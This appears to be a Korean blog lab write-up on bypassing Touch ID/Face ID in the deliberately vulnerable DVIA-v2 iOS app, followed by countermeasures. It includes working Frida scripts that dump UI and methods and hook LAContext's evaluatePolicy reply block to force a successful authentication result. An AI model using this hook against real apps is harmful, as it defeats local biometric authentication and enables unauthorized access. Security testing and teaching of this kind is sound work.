---
layout: post
title: iOS DVIA-v2 | Touch & Face ID Bypass
subtitle: 로컬 인증 우회 취약점
categories: iOS
tags: [iOS, Moblie]
---

## 취약점 개요

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/8143fce2-9080-494e-8005-e16ba03b8884">
</p>

**로컬 인증 우회**은 단말기 내에 어느 한 서비스 접근 시 인증을 요구할 때 해당 인증 로직이 로컬에서만 이루어지며 이 인증을 우회하는 것을 뜻한다. 많은 사용자가 안전하고 간편한 디바이스 액세스를 위해 **Face ID, Touch ID, Optic ID**와 같은 생체 인증을 사용한다.

생체 인식 기능이 없는 디바이스의 경우 대체 옵션으로 비밀번호나 암호를 사용하는 것도 비슷한 용도로 사용됩니다. 해당 인증 정보를 서버로 ID와 PW 등을 전송하여 해당 값이 옳은 지 판단하는 것이 아닌 단말기 내에서 인증 정보를 검증할 때 이러한 취약점이 발견될 수 있다.

## 취약점 실습

* **실습 환경 : iOS 14.6, iPhone 8**

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/210b2789-38c1-43b7-bbd8-6c9fb23d3396">
</p>

* **좌측 상단 메뉴 > Touch/Face ID Bypass**

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/9a8d4cf7-c8a8-4239-bcf6-bac91214b16a">
</p>

**Swift Implementation**과 **Objective-C Implementation**의 지문 버튼을 클릭하면 Touch ID 인증을 진행하게 되는데 이 때 로컬에 저장되어 있는 생체 인증 정보가 아닌 경우 인증 완료가 되지 않은 것을 알 수 있다.

### UI Dump

```Javascript
// 사용중인 UI 리스트

var colors = {
    "reset" : "\x1b[0m",
    "red" : "\x1b[31m",
    "green" : "\x1b[32m",
    "yellow" : "\x1b[33m",
    "blue" : "\x1b[34m"
}

var window = ObjC.classes.UIWindow.keyWindow();
var rootControl = window.rootViewController();

var ui = window.recursiveDescription().toString();
var ui_autolayout = window['- _autolayoutTrace']().toString();
var control = rootControl['- _printHierarchy']().toString();

console.log(colors.green + control + colors.reset); 
```

* **현재 사용 중인 앱의 UI 내용 출력 코드**

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/f7db7637-0038-4de9-8477-89ca6e3b6738">
</p>

`frida -U -f com.highaltitudehacks.DVIAswiftv2 -l .\Hook\iOS\1_Ui_dump.js`로 해당 코드를 실행하게 되면 처음에는 어떠한 값을 받아오지 못하지만 원하는 Ui로 이동 후 해당 코드에서 `Ctrl + S` 저장하게 되면 해당 Ui에서 다시 한 번 코드가 실행되게 된다.

그 때 위 처럼 초록색으로 어떠한 Ui로 실행되고 있는지 확인할 수 있다. 코드 인증 View에서 사용중인 Ui는 `DIVA_v2.TouchIDDetailsViewController`임을 알 수 있다.

### Method Dump in UI

```Javascript
// 해당 클래스 내에 메소드 리스트 출력

let colors = {
    "reset" : "\x1b[0m",
    "red" : "\x1b[31m",
    "green" : "\x1b[32m",
    "yellow" : "\x1b[33m",
    "blue" : "\x1b[34m"
}

if (ObjC.available) {
    try {
        var className = "DVIA_v2.AntiAntiHookingDebuggingViewController";    // 찾고 싶은 class 이름으로 변경
        var methods = ObjC.classes[className].$ownMethods;
  
        console.warn("\n[*] Started: Find All Methods of a class " + '"' + className + '"');
        
        for (var i = 0; i < methods.length; i++) {
            try { console.log("\x1b[32m"+methods[i] + "\x1b[0m"); }
            catch(err) { console.log("[!] Exception1: " + err.message); }
        }}
    catch(err) { console.log("[!] Exception2: " + err.message); } }
  
  else { console.log("Objective-C Runtime is not available!"); }
  
  console.warn("[*] Completed: Find All Methods of a Class " + '"' + className + '"');
```

* **현재 UI에서 사용중인 메소드 출력 코드**

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/7393fc57-2911-4d96-bf97-0c720a9d0d21">
</p>

`frida -U -f com.highaltitudehacks.DVIAswiftv2 -l .\Hook\iOS\2_Method_dump.js`로 해당 코드를 실행하게 되면 해당 클래스에서 사용중인 모든 메소드가 나오게 되는데 `Disable Debugging` 버튼을 눌렀을 때 실행될 것으로 추측되는 메소드 `- touchIDTapped:`를 확인할 수 있다.

### 메소드 분석

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/9c4a6b01-c49c-42e7-bcee-3ac281105fcd">
</p>

확인된 메소드 `- disableDeubbingTapped:`에 대한 분석을 위해 IDA 프로그램으로 확인한 결과 이동할 분기는 `_T07DVIA_v228TouchIDDetailsViewControllerC13touchIDTappedyypF`로 보인다.

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/9c51e3a0-8574-4f11-897d-d39f61d1e913">
</p>

해당 분기로 이동하면 `LAContext`라는 분기로 이동하는 것을 볼 수 있고 바로 아래에는 `selRef_canEvalutePolicy_error_` 클래스 메소드를 호출하는 것을 알 수 있다.

#### LAContext

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/ebe0122e-5414-44c1-a745-5e80f4d0b00a">
</p>

여기서 사용된 `LAContext`는 `Local Authentication`의 약자로 사용자가 단말기내에서 인증하는 부분을 담당하는 프레임워크로 생체 인증 및 암호 인증 구현이 여기에 해당된다.

사용자가 인증을 해야할 때 사용자에게 인증을 원하는 이유를 알려주는 메시지를 표시하고 그런 다음 **Secure Enclave**와 조정하여 작업을 수행하고, 성공과 실패를 나타내는 **Boolean 결과**를 얻게 된다.

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/4af7f76e-72f3-430a-9c2c-5fe13e07e73c">
</p>

`TBZ W9, #0, loc_1001B92E4`를 확인하면 **W9** 레지스터의 값이 0인 경우 Touch ID가 비활성화된 것으로 간주하여 Touch ID를 지원하지 않는 기기이거나 아직 설정하지 않았다는 메세지를 보내는 분기로 이동하게 된다.

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/436d3a21-8abb-4eab-955a-7358e9a41f45">
</p>

Touch ID 활성화 분기로 이동하면 `selRef_evaluatePolicy_localizedReason_reply_` 클래스 메소드를 호출하는데 이 함수의 역할은 **Face ID/Touch ID (생체인식 인증)** 또는 **Passcode (암호 인증)** 를 사용한 인증을 실행해주는 코드다.

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/0094cb14-322b-490e-aa46-84d0aac4973c">
</p>

총 3가지 파라미터가 들어가게 되는데 여기서 인증 결과를 확인하는 파라미터로는 `reply; @escaping`으로 `escaping closer`를 사용하는 파라미터이다.

`escaping closer`는 해당 함수가 실행이 종료된 이후 실행되는 클로저로 `evaluatePolicy()`함수가 종료 될 때 `@escaping (Bool, Error?)`의 Bool을 기준으로 인증 완료 및 실패를 나타내게 된다.

```javascript
// 이벤트 처리 시 해당 메소드가 맞는지 체크

let colors = {
    "reset" : "\x1b[0m",
    "red" : "\x1b[31m",
    "green" : "\x1b[32m",
    "yellow" : "\x1b[33m",
    "blue" : "\x1b[34m"
}

if (ObjC.available) {
	var className = "LAContext"; 
	var methodName = "- evaluatePolicy:localizedReason:reply:";
	var TouchID = eval('ObjC.classes.' + className + '["' + methodName + '"]');

    Interceptor.attach(TouchID.implementation, {
		onEnter: function(args){
			console.log(colors.red, "\n [*] onEnter");
			console.log(colors.blue, "\t[+] args0 : " + args[0]);
			console.log(colors.blue, "\t[+] args1 : " + args[1]);
			console.log(colors.blue, "\t[+] args2 : " + args[2]);
			console.log(colors.blue, "\t[+] args3 : " + args[3]);
		},
		onLeave:function(retval){                
			console.log(colors.red, "[*] onleave");
			console.log(colors.yellow, "\t[+] Class Name : " + className)
			console.log(colors.yellow, "\t[+] Method Name : " + methodName)
			console.log(colors.yellow, "\t[+] Type of return value : " + TouchID.returnType) 
			console.log(colors.yellow, "\t[+] Return Value : " + retval, colors.reset)
		}
	})
}
```

`- evaluatePolicy:localizedReason:reply:`함수가 실행 될 때와 실행 완료 되었을 때 인자 값을 확인하여 어느 인자 값이 `reply`에 해당하는지 확인한다.

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/779c4dea-7a22-405f-916f-3d6d25c3e924">
</p>

해당 함수는 `escaping closer`로 함수가 실행이 종료된 후 실행되는 `reply`가 Return 되는데 이는 **arg3**의 값인 것을 알 수 있다.

따라서, 로컬 인증 시도 후 취소 버튼을 클릭해 함수 종료를 유도하여 **arg3**를 재호출하면 Bool 값을 True로 변경하여 실행하게 되므로 로컬 인증 우회가 가능하다.

_(**Object-C implemetation**의 경우도 타고 들어가보면 결국 `- evaluatePolicy:localizedReason:reply:` 함수를 사용하기에 같은 방법이라 볼 수 있다.)_

### Frida Code

```javascript
let colors = {
    "reset" : "\x1b[0m",
    "red" : "\x1b[31m",
    "green" : "\x1b[32m",
    "yellow" : "\x1b[33m",
    "blue" : "\x1b[34m"
}

if (ObjC.available) {
	var className = "LAContext"; 
	var methodName = "- evaluatePolicy:localizedReason:reply:";
	var TouchID = eval('ObjC.classes.' + className + '["' + methodName + '"]');

    Interceptor.attach(TouchID.implementation, {
		onEnter: function(args){
			console.log(colors.red, "\n [*] onEnter");
			console.log(colors.blue, "\t[+] args[0] : " + args[0]);
			console.log(colors.blue, "\t[+] args[1] : " + args[1]);
			console.log(colors.blue, "\t[+] args[2] : " + args[2]);
			console.log(colors.blue, "\t[+] args[3] : " + args[3]);

			var reply = new ObjC.Block(args[4]);
			const appCallback = reply.implementation;
            reply.implementation = function (success, error)  {
                console.log(colors.yellow, "[!] success : " + success + colors.red,"\n [!] error : " + error);
                const result = appCallback(true, null);
                return result;
            };
		},
	})
}
```

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/fa81eff3-3794-4d4f-a44d-7c941187ee74">
</p>

로컬 인증을 시도 후 취소하게 되면 `success : false`로 넘어가며 `reply` 함수의 인자를 `true`로 변경하여 재실행하기에 우회가 가능하다.

## 대응 방안

* 디버깅 차단

    * **Using ptrace** : **PT_DENY_ATTACH**를 사용한 안티 디버깅

    * **Using sysctl** : `sysctl`을 호출하여 반환된 **info.kp_proc.p_flag**플래그 확인

    * **Using getppid** : 일반적인 어플리케이션의 경우 사용자 모드에서 Launched Process에 의해 실행되면 `PID`가 1, 디버거에 의해 실행되는 경우 `getppid`가 1이 아닌 다른 값

* `Frida`를 이용한 런타임 조작이 대중적이기에 Frida 자체 차단

    * **Frida Binary**

    * **Frida Sever Port** : 27042 포트 사용 확인

    * **Frida D-Bus**

    * **Frida Library** : 타겟 프로세스에 주입된 Frida-agent Library file 확인

    * **Frida Thread**

    * **Frida Hook** : Frida가 사용하는 Hook 방식인 Inline Hook 탐지

* 런타임 조작은 단순히 `Frida`를 이용할 뿐만 아니라 디버깅 과정에서도 조작이 가능하기에 디버깅을 차단

## Reference

* [https://developer.apple.com/documentation/localauthentication/](https://developer.apple.com/documentation/localauthentication/)

